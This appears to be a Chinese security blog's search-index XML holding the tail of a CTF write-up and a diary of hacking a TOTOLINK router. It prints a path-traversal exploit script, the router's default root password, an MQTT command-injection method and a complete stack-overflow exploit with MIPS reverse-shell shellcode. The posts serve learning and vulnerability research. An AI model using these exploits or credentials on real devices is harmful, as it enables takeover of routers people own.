class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>flag=<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30318</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;&#x27;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-comment"># url = &quot;http://127.0.0.1:4000/&quot;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># payload = &quot;a&quot;*0x3a + &quot;/../../../bin/sh?korey0sh1.html&quot;</span><br><span class="hljs-comment"># res = requests.get(url=url,auth=(&quot;Admin&quot;,payload))</span><br><span class="hljs-comment"># print(res.text)</span><br><br>payload = <span class="hljs-string">b&#x27;GET / HTTP/1.1\r\n&#x27;</span><br>payload += <span class="hljs-string">b&#x27;Authorization: Basic &#x27;</span> <br>payload += base64.b64encode(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;/../../../../../../bin/sh?korey0sh1.html&#x27;</span>)<br>payload += <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br><br>sd(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>不知道为什么request发包不行</p><h1 id="0xff-写在最后的最后"><a href="#0xff-写在最后的最后" class="headerlink" title="0xff:写在最后的最后"></a>0xff:写在最后的最后</h1><p>题目感觉都挺常规的（pwn被各位大爹打烂了）</p><p>mi_malloc第一次做，学到新东西，很感谢出题师傅。</p><p>httpd这种协议模拟题好像碰到的越来越多了，感觉要搞个专题好好强化一下。</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>倒霉蛋的totolink学习手记</title>
    <link href="/2023/07/12/%E5%80%92%E9%9C%89%E8%9B%8B%E7%9A%84totolink%E5%AD%A6%E4%B9%A0%E6%89%8B%E8%AE%B0/"/>
    <url>/2023/07/12/%E5%80%92%E9%9C%89%E8%9B%8B%E7%9A%84totolink%E5%AD%A6%E4%B9%A0%E6%89%8B%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>kernel、v8、虚拟化、Iot，因为笔者并不想在pwn的学习上止步于CTF，且对Iot也有点兴趣，故选择了这条路（你以为是我不想当个内核带师吗，是实在是学不会啊）</p><p>在nameless爷爷的推荐下，笔者在咸鱼上买了一个totolink，以此来作为笔者Iot漏洞挖掘的入门教材。</p><h1 id="0x1-拿不到shell，妈妈生的"><a href="#0x1-拿不到shell，妈妈生的" class="headerlink" title="0x1:拿不到shell，妈妈生的"></a>0x1:拿不到shell，妈妈生的</h1><p>现在官网下载固件<a href="https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/172/ids/36.html">@totolink</a></p><p>用binwalk解压，提取出文件系统squashfs-root</p><p>在里面随便找找，便看到了telnet.asp，那便可以通过telnet服务拿到路由器的shell</p><p>再搜索一下“shadow”这种敏感文件</p><p><img src="/img/T10/1.png" alt="img"></p><p>user:root</p><p>pwd:其实网上一找就是“cs2012”，md5付费解密也行</p><p>OK现在就可以拿一下路由器的shell了</p><p>拿到设备先暴拆，然后插上网线，笔电连上totolink的无线</p><p><img src="/img/T10/0.jpg" alt="img"></p><p>登录网关</p><p><img src="/img/T10/2.png" alt="img"></p><p>可以看到笔者这个设备的固件版本已经很老了</p><p>先把网段改到192.168.55.1，避免和原本的撞上，再把防火墙一关，试着访问【IP】&#x2F;telnet.asp</p><p>结果半天加载不出来</p><p>后来无意看到totolink这个牌子要用极为先进的360浏览器的兼容模式才能访问（真的吐血）</p><p>通过网页把telnet的服务打开后，试着用nmap扫一下</p><p><img src="/img/T10/3.png" alt="img"></p><p>可以看到telnet服务的默认端口”23“已经打开，需要注意到的是这边还有个mqtt服务的默认端口1883也打开了</p><p>用telnet登录，user:root password:cs2012</p><p><img src="/img/T10/4.png" alt="img"></p><p>登陆进去了，好耶！！</p><p>结果默认的busybox着实有点寒酸，好在有wget，那就起个http服务拉个mipsel架构的busybox进去好了</p><p><img src="/img/T10/5.png" alt="img"></p><p>同时因为笔者的路由器固件版本实在是太老，所以笔者按照<a href="https://l0tus.vip/cn/totolink/">@I0tus</a>师傅博客中的方法，把真机中的固件拉了出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./busybox-mipsel sh<br>./busybox-mipsel <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtdblock1 of=./mtdblock1<br><span class="hljs-comment">#先在宿主机起个ftp</span><br>./busybox-mipsel ftpput -P 21 192.168.55.2 ./mtdblock1<br></code></pre></td></tr></table></figure><p>因为想试着打打真机，所以笔者接下来的分析都基于这份提取出来的固件</p><h1 id="0x2-用mqtt狠狠地注入"><a href="#0x2-用mqtt狠狠地注入" class="headerlink" title="0x2:用mqtt狠狠地注入"></a>0x2:用mqtt狠狠地注入</h1><p>用burp抓个包先</p><p>访问网关</p><p><img src="/img/T10/6.png" alt="img"></p><p>登录</p><p><img src="/img/T10/7.png" alt="img"></p><p>开启telnet服务</p><p><img src="/img/T10/9.png" alt="img"></p><p>看起来负责网络服务的是这个&#x2F;cgi-bin&#x2F;cstecgi.cgi</p><p>登录的时候存在密码泄露问题</p><p>同时，在使用登录服务和telnet服务的时候，可以看到有一些特别的字符串。</p><p>那就搜一下</p><p>”topicurl”存在于这几个elf文件中，结合抓包中出现的cstecgi.cgi，就把这个文件用ida打开看看</p><p><img src="/img/T10/10.png" alt="img"></p><p>结果刚进main函数一眼command injection，太抽象了</p><p><img src="/img/T10/11.png" alt="img"></p><p>但是cstecgi.cgi中并没有和“topicurl”实质有关的东西。</p><p>那再找一下”telnet_enabled”</p><p><img src="/img/T10/12.png" alt="img"></p><p>进system.so康康</p><p>找到了一个setTelnetCfg，发现和开关telnet服务的参数很像</p><p><img src="/img/T10/13.png" alt="img"></p><p>回溯这个函数， 出现module_init</p><p><img src="/img/T10/14.png" alt="img"></p><p>OK，cstecgi.cgi负责的是http服务，但最后的setTelnetCfg却是在module_init中执行。cstecgi.cgi找不到加载system.so的痕迹，两者并无瓜葛。</p><p>翻看<a href="https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/#%E9%9A%90%E8%97%8F%E7%9A%84telnet%E5%8A%9F%E8%83%BD">@blingbling</a>师傅的博客后，发现此处使用的是dlopen的方法（路径+.so文件名），于是搜索路径”&#x2F;lib&#x2F;cste_modules”</p><p>出现了唯一匹配的结果</p><p><img src="/img/T10/15.png" alt="img"></p><p>找到dlopen函数，这样思路就理通了</p><p><img src="/img/T10/16.png" alt="img"></p><p>cstecgi.cgi接受到http请求后，通过cste_sub做中转，然后到system.so执行。</p><p>那么问题来了，cste_sub是啥嘞</p><p>在路由器里用netstat -pantu查看端口后得知，cste_sub是1883端口（cs_broker）的客户端，而1883端口是mqtt的默认端口。</p><p><img src="/img/T10/17.png" alt="img"></p><p>所以在此设备中，http请求会先被转化mqtt，然后在不同的.so文件中得到执行。</p><p>那就来用mqtt狠狠注入吧！！</p><p>先下载mqtt.fx，配置好ip后订阅全部，为了效果显著一点，我们可以找一个command injection来试试</p><p>在&#x2F;lib&#x2F;cste_modules&#x2F;upgrade.so的function–setUpgradeFW中，存在一个command injection</p><p><img src="/img/T10/18.png" alt="img"></p><p>构造数据，直接用mqtt发送（${IFS}是用来绕过空格的）</p><p><img src="/img/T10/19.png" alt="img"></p><p>可以看到tmp文件夹下已经出现目标文件</p><p><img src="/img/T10/20.png" alt="img"></p><h1 id="0x3-来试试栈溢出吧"><a href="#0x3-来试试栈溢出吧" class="headerlink" title="0x3:来试试栈溢出吧"></a>0x3:来试试栈溢出吧</h1><p>&#x2F;lib&#x2F;cste_modules&#x2F;wps.so 中的function–setWiFiWpsConfig存在栈溢出漏洞</p><p>先拉个mipsel架构的gdbserver进去，在这边调试的时候是attach cste_sub的pid</p><p><img src="/img/T10/22.png" alt="img"></p><p>为了方便调试，这次用python发数据包</p><p>但是也可以先用mqtt.fx先发个cyclic生成的字符串确定一下offset</p><p><img src="/img/T10/23.jpg" alt="img"></p><p>然后用msf反弹shell一把梭</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-keyword">import</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">import</span> <span class="hljs-variable">paho</span>.<span class="hljs-property">mqtt</span>.<span class="hljs-property">client</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">mqtt</span><br><span class="hljs-keyword">import</span> <span class="hljs-variable">threading</span><br><br><span class="hljs-title function_">context</span>(<span class="hljs-variable">os</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">linux</span>&#x27;, <span class="hljs-variable">arch</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">mips</span>&#x27;, <span class="hljs-variable">log_level</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">debug</span>&#x27;)<br><br><span class="hljs-variable">buf</span> <span class="hljs-operator">=</span>  <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfa\xff\x0f<span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x78</span>\xe0<span class="hljs-char escape_">\x01</span>\xfd\xff\xe4<span class="hljs-char escape_">\x21</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfd\xff\xe5<span class="hljs-char escape_">\x21</span>\xff\xff<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>\xff\xff\xa2\xaf\xff\xff\xa4\x8f&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfd\xff\x0f<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x78</span>\xe0<span class="hljs-char escape_">\x01</span>\xe2\xff\xaf\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x09</span>\x1d\x0e\x3c<span class="hljs-char escape_">\x09</span>\x1d\xce<span class="hljs-char escape_">\x35</span>\xe4\xff\xae\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x37</span><span class="hljs-char escape_">\x02</span>\x0e\x3c\xc0\xa8\xce<span class="hljs-char escape_">\x35</span>\xe6\xff\xae\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xe2\xff\xa5<span class="hljs-char escape_">\x27</span>\xef\xff\x0c<span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x01</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\x4a<span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>\xfd\xff<span class="hljs-char escape_">\x11</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x88</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x02</span>\xff\xff\xa4\x8f<span class="hljs-char escape_">\x21</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x02</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xdf\x0f<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>\xff\xff<span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xff\xff<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x22</span>\xfa\xff<span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x16</span>\xff\xff<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x28</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x62</span><span class="hljs-char escape_">\x69</span>\x0f\x3c\x2f\x2f\xef<span class="hljs-char escape_">\x35</span>\xec\xff\xaf\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x68</span>\x0e\x3c\x6e\x2f\xce<span class="hljs-char escape_">\x35</span>\xf0\xff\xae\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xf4\xff\xa0\xaf\xec\xff\xa4<span class="hljs-char escape_">\x27</span>\xf8\xff\xa4\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfc\xff\xa0\xaf\xf8\xff\xa5<span class="hljs-char escape_">\x27</span>\xab\x0f<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>&quot;</span><br><br><span class="hljs-variable">pay</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-operator">*</span><span class="hljs-number">60</span> <span class="hljs-operator">+</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x44</span><span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x42</span>&quot;</span><br><br><span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-variable">mqtt</span>.<span class="hljs-property">Client</span>()<br><span class="hljs-variable">client</span>.<span class="hljs-property">connect</span>(<span class="hljs-string">&quot;192.168.55.1&quot;</span>,<span class="hljs-number">1883</span>,<span class="hljs-number">60</span>)<br><span class="hljs-variable">client</span>.<span class="hljs-property">publish</span>(&#x27;<span class="hljs-variable">totolink</span>/<span class="hljs-variable">router</span>/<span class="hljs-variable">setting</span>/<span class="hljs-variable">setWiFiWpsConfig</span>&#x27;,<span class="hljs-variable">payload</span><span class="hljs-operator">=</span>&#x27;&#123;<span class="hljs-string">&quot;topicurl&quot;</span>:<span class="hljs-string">&quot;setting/setWiFiWpsConfig&quot;</span>,<span class="hljs-string">&quot;WiFiIdx&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;PINPBCRadio&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;PINMode&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;PIN&quot;</span>:<span class="hljs-string">&quot;&#x27;+pay+&#x27;&quot;</span>&#125;&#x27;<span class="hljs-operator">+</span>&#x27;<span class="hljs-variable">bbbbb</span>&#x27;<span class="hljs-operator">+</span><span class="hljs-variable">buf</span>)<br></code></pre></td></tr></table></figure><p>比较蛋疼的是好像只有python2发过去的数据是正常的，python3就是一堆乱码</p><p>反弹shell的目标一定要和路由器同一个网段，不然弹不出来</p><h1 id="0x4-带学牲的第一次漏洞挖掘"><a href="#0x4-带学牲的第一次漏洞挖掘" class="headerlink" title="0x4:带学牲的第一次漏洞挖掘"></a>0x4:带学牲的第一次漏洞挖掘</h1><p>水了两个CVE（CVE-2023-40041&amp;CVE-2023-40042)，都是低质量漏洞，当时只想着能不能拿个CVE也没怎么深挖</p><h1 id="0x5-UART串口调试"><a href="#0x5-UART串口调试" class="headerlink" title="0x5: UART串口调试"></a>0x5: UART串口调试</h1><p>第一次焊接，属实是丑了一点，但好在功能是一点问题都没有</p><p><img src="/img/iot1/0.jpg" alt="img"></p><p>Nameless爷爷推荐的三排针确实挺好用的，但是这送的锡丝就是一坨shit，质量差的一批。</p><p>用SecureCRT直接quick connect就能进，但不知道为什么我笔记本两个COM口一个连上去就是没反应，换了一个就行了。</p><p>但进去后奇怪的是在uboot加载好后kernel加载之前狂按回车进不到uboot。</p>]]></content>
    
    
    <categories>
      
      <category>Iot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
